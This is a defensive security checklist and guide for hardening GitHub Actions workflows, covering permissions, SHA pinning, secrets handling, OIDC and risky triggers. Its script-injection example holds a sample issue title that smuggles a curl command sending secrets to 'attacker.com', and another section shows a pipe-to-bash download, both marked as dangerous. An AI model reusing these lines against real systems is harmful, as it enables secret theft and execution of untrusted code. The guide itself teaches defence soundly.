# Security Checklist

Comprehensive security best practices for GitHub Actions workflows.

## Quick Security Audit

Run through this checklist when reviewing any workflow:

- [ ] GITHUB_TOKEN permissions set to minimum required (default: read-only)
- [ ] Actions pinned to commit SHA or trusted tags (not branches)
- [ ] No secrets in logs or outputs
- [ ] No use of pull_request_target with untrusted code execution
- [ ] Environment secrets protected with required reviewers for production
- [ ] OIDC used for cloud provider authentication (no long-lived credentials)
- [ ] Self-hosted runner restrictions applied (if using self-hosted)
- [ ] Third-party actions from verified creators or source reviewed
- [ ] No hardcoded credentials or API keys
- [ ] Secrets rotated regularly

## GITHUB_TOKEN Permissions

### Default to Read-Only

**ALWAYS set workflow-level permissions to read-only:**

```yaml
permissions:
  contents: read
```

This ensures that GITHUB_TOKEN has minimal access by default, preventing accidental or malicious repository modifications.

### Granular Permissions

Add specific permissions only where needed:

```yaml
permissions:
  contents: read          # Default
  pull-requests: write    # Comment on PRs
  issues: write           # Create/comment on issues
  packages: write         # Publish packages
  deployments: write      # Create deployments
  id-token: write         # OIDC authentication
  checks: write           # Create check runs
```

### Job-Level Permissions

Override at job level for specific needs:

```yaml
permissions:
  contents: read

jobs:
  deploy:
    permissions:
      contents: write       # Allow pushing tags/releases
      deployments: write    # Create deployment
    steps:
      - run: ./deploy.sh

  test:
    # Inherits workflow-level read-only
    steps:
      - run: npm test
```

### Common Permission Requirements

| Task | Required Permission |
|------|---------------------|
| Checkout code | `contents: read` |
| Push commits/tags | `contents: write` |
| Comment on PRs | `pull-requests: write` |
| Create releases | `contents: write` |
| Publish packages | `packages: write` |
| OIDC authentication | `id-token: write` |
| Create check runs | `checks: write` |

## Action Pinning

### Always Pin to Commit SHA (Most Secure)

```yaml
# ✅ RECOMMENDED: Pin to commit SHA with comment showing version
- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1

# ⚠️ ACCEPTABLE: Pin to version tag (if you trust the creator)
- uses: actions/checkout@v4

# ❌ DANGEROUS: Branch reference (can change at any time)
- uses: actions/checkout@main
```

### Why Pin to SHA?

- Tags can be force-pushed and changed
- Branch refs can be updated maliciously
- Commit SHAs are immutable
- Prevents supply chain attacks

### Finding Commit SHAs

```bash
# Get SHA for a specific tag
git ls-remote https://github.com/actions/checkout v4.1.1

# Or browse releases on GitHub
```

### Exception: Trusted Organizations

For actions from GitHub and other major organizations, version tags are acceptable:
- `actions/*` - GitHub official actions
- `docker/*` - Docker official actions
- Major verified creators

## Secrets Management

### Store Secrets in GitHub Secrets

**NEVER hardcode secrets in workflow files:**

```yaml
# ❌ NEVER DO THIS
env:
  API_KEY: sk_live_abc123

# ✅ USE GITHUB SECRETS
env:
  API_KEY: ${{ secrets.API_KEY }}
```

### Mask Dynamic Secrets

If you generate secrets at runtime, mask them:

```yaml
- name: Generate token
  run: |
    TOKEN=$(./get-token.sh)
    echo "::add-mask::$TOKEN"
    echo "TOKEN=$TOKEN" >> $GITHUB_ENV
```

### Never Log Secrets

```yaml
# ❌ NEVER DO THIS
- run: echo "Token is ${{ secrets.API_KEY }}"

# ❌ ALSO DANGEROUS
- run: |
    echo "Deploying with credentials"
    printenv | grep API  # Could expose secrets

# ✅ SAFE
- run: |
    if [ -z "$API_KEY" ]; then
      echo "API_KEY not set"
      exit 1
    fi
    echo "API_KEY is configured"
  env:
    API_KEY: ${{ secrets.API_KEY }}
```

### Environment Secrets with Protection

Use environment secrets for production deployments:

```yaml
jobs:
  deploy:
    environment: production  # Requires manual approval
    steps:
      - run: ./deploy.sh
        env:
          PROD_API_KEY: ${{ secrets.PROD_API_KEY }}
```

Configure environment protection rules:
1. Go to repository Settings → Environments
2. Add environment (e.g., "production")
3. Configure protection rules:
   - Required reviewers (1-6 people)
   - Wait timer (delay before deployment)
   - Deployment branches (restrict to main/release branches)

### Rotate Secrets Regularly

- Set expiration reminders for long-lived tokens
- Use short-lived tokens when possible (OIDC)
- Revoke immediately if compromised
- Audit secret usage in repository settings

### Organization vs Repository Secrets

**Organization secrets**: Shared across multiple repositories
- Use for common credentials (shared APIs, registries)
- Restrict to specific repositories

**Repository secrets**: Single repository only
- Use for repo-specific credentials
- More granular control

## OIDC Authentication (Credential-less)

Use OpenID Connect to authenticate with cloud providers without storing long-lived credentials.

### AWS OIDC

```yaml
permissions:
  id-token: write    # Required for OIDC
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/GitHubActionsRole
          aws-region: us-east-1

      - run: aws s3 ls
```

AWS IAM Role Trust Policy:
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com"
      },
      "Action": "sts:AssumeRoleWithWebIdentity",
      "Condition": {
        "StringEquals": {
          "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
          "token.actions.githubusercontent.com:sub": "repo:owner/repo:ref:refs/heads/main"
        }
      }
    }
  ]
}
```

### Google Cloud OIDC

```yaml
permissions:
  id-token: write
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: google-github-actions/auth@v2
        with:
          workload_identity_provider: 'projects/123456789/locations/global/workloadIdentityPools/github/providers/github'
          service_account: 'github-actions@project.iam.gserviceaccount.com'

      - run: gcloud storage ls
```

### Azure OIDC

```yaml
permissions:
  id-token: write
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: azure/login@v2
        with:
          client-id: ${{ secrets.AZURE_CLIENT_ID }}
          tenant-id: ${{ secrets.AZURE_TENANT_ID }}
          subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}

      - run: az storage account list
```

### Benefits of OIDC

- No long-lived credentials stored in GitHub Secrets
- Automatic token rotation (tokens are short-lived)
- Fine-grained access control with conditions
- Audit trail via cloud provider logs
- Reduced risk of credential leakage

## Dangerous Triggers

### pull_request_target

**DANGEROUS when executing untrusted code:**

```yaml
# ❌ DANGEROUS: Runs PR code in base repo context with secrets
on: pull_request_target

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # PR code
      - run: npm install && npm build  # Could execute malicious code!
```

**Safe usage patterns:**

```yaml
# ✅ SAFE: Only labeling, commenting (no code execution)
on: pull_request_target

permissions:
  pull-requests: write
  contents: read

jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/labeler@v5  # Trusted action only

# ✅ SAFE: Use pull_request instead
on: pull_request  # Runs in fork context, no secrets

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm install && npm build
```

### workflow_run

Similar risks to pull_request_target - runs in base repository context.

**Only use for trusted workflows**, never execute untrusted code from artifacts.

## Self-Hosted Runners

### Security Risks

Self-hosted runners are **MORE RISKY** than GitHub-hosted:
- Persistent state between jobs
- Network access to internal resources
- Credential leakage across jobs
- Malicious code can persist

### Mitigation Strategies

1. **Use ephemeral runners** (destroyed after each job)
2. **Never use self-hosted runners with public repositories**
3. **Isolate runners** (separate network, no access to production)
4. **Monitor runner activity** (logs, audit trails)
5. **Restrict to private repos with approved users**
6. **Use runner groups** with access controls

```yaml
# Restrict to specific runner group
runs-on: [self-hosted, production]
```

7. **Regular security updates** (OS, software, Docker)
8. **Disable runner when not in use**

## Third-Party Actions

### Vetting Actions

Before using third-party actions:

1. **Check action source**:
   - Verified creator badge?
   - Active maintenance (recent commits)?
   - Many stars/users?

2. **Review action code**:
   - Small, focused action
   - No suspicious network calls
   - Appropriate permissions requested

3. **Check security alerts**:
   - Dependabot alerts
   - Known vulnerabilities

4. **Use pinned versions**:
   ```yaml
   - uses: some-org/action@a1b2c3d4  # SHA
   ```

### Alternatives to Third-Party Actions

Instead of untrusted third-party actions, consider:

1. **Official actions** from GitHub, Docker, cloud providers
2. **Inline scripts** with explicit commands
3. **Custom actions** in your own repository
4. **Composite actions** combining trusted actions

## Input Validation

### Script Injection

**ALWAYS validate inputs before using in shell:**

```yaml
# ❌ DANGEROUS: Command injection possible
- name: Greet user
  run: echo "Hello ${{ github.event.issue.title }}"
  # If title is: "Test"; curl attacker.com/steal?data=$(cat secrets)

# ✅ SAFE: Use environment variables
- name: Greet user
  env:
    TITLE: ${{ github.event.issue.title }}
  run: echo "Hello $TITLE"
```

### PR Title/Body Validation

```yaml
# ✅ Validate before processing
- name: Validate PR title
  run: |
    if [[ ! "$PR_TITLE" =~ ^(feat|fix|docs|chore): ]]; then
      echo "Invalid PR title format"
      exit 1
    fi
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
```

## Security Scanning

### Enable Dependabot

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
```

### Code Scanning

```yaml
name: CodeQL

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:
  analyze:
    runs-on: ubuntu-latest
    permissions:
      security-events: write
      contents: read

    steps:
      - uses: actions/checkout@v4

      - uses: github/codeql-action/init@v3
        with:
          languages: javascript, typescript

      - uses: github/codeql-action/autobuild@v3

      - uses: github/codeql-action/analyze@v3
```

### Secret Scanning

GitHub automatically scans for exposed secrets. Configure alerts:
1. Repository Settings → Security → Secret scanning
2. Enable "Secret scanning"
3. Enable "Push protection" (blocks pushes with secrets)

## Network Access Control

### Restrict outbound connections

```yaml
# Use GitHub's environment network restrictions
jobs:
  build:
    runs-on: ubuntu-latest
    # Only allow specific outbound connections
```

### Avoid fetching untrusted resources

```yaml
# ❌ DANGEROUS: Arbitrary code execution
- run: curl https://untrusted.com/script.sh | bash

# ✅ SAFE: Pin to specific versions, verify checksums
- run: |
    curl -O https://releases.example.com/tool-1.2.3.tar.gz
    echo "abc123... tool-1.2.3.tar.gz" | sha256sum -c -
    tar xzf tool-1.2.3.tar.gz
```

## Audit Logging

### Monitor workflow runs

1. Repository Settings → Actions → General
2. Enable "Require approval for all outside collaborators"
3. Review workflow run logs regularly

### Export audit logs (Enterprise)

```bash
# GitHub CLI
gh api /orgs/ORG/audit-log --paginate
```

### Key events to monitor

- Workflow modifications
- Secret access
- Self-hosted runner registration
- Failed authentications
- Permission changes

## Compliance

### Required workflows (Enterprise)

Enforce security checks across all repositories:

```yaml
# .github/workflows/required-security.yml
name: Required Security Checks

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: github/codeql-action/analyze@v3
```

### Branch protection rules

Require status checks before merging:
1. Repository Settings → Branches
2. Add rule for main branch
3. Require status checks to pass
4. Select required workflows

## Security Checklist Summary

Use this for every workflow review:

### Critical (Must Fix)
- [ ] Workflow-level permissions set to read-only (or minimal required)
- [ ] No hardcoded secrets/credentials
- [ ] Actions pinned to SHA or trusted tags
- [ ] No pull_request_target with untrusted code execution
- [ ] Input validation for user-controlled data

### Important (Should Fix)
- [ ] OIDC used for cloud deployments (vs long-lived credentials)
- [ ] Environment secrets protected with reviewers for production
- [ ] Third-party actions reviewed and from trusted sources
- [ ] Secrets masked in logs
- [ ] Regular secret rotation plan

### Recommended (Nice to Have)
- [ ] Dependabot enabled for actions
- [ ] CodeQL scanning enabled
- [ ] Audit logging reviewed regularly
- [ ] Self-hosted runners properly isolated (if used)
- [ ] Documentation of security requirements

## Resources

- [GitHub Actions Security Hardening](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [OIDC with GitHub Actions](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect)
- [Keeping your GitHub Actions secure](https://github.blog/2021-04-22-keeping-your-github-actions-secure/)
- [GitHub Actions Security Best Practices](https://www.stepsecurity.io/blog/github-actions-security-best-practices)
